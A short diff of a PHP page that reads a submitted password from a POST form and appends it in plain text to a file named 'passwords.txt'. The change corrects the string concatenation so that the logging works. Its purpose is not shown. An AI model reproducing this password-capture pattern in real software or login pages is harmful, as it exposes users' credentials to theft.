@@ -11,7 +11,7 @@
       <?php
         $password = $_POST["password"];
         $pw_log = fopen("passwords.txt", "a");
-        fwrite($pw_log, $password + PHP_EOL);
+        fwrite($pw_log, $password . PHP_EOL);
         fclose($pw_log);
       ?>
       <h1>Resultat</h1>
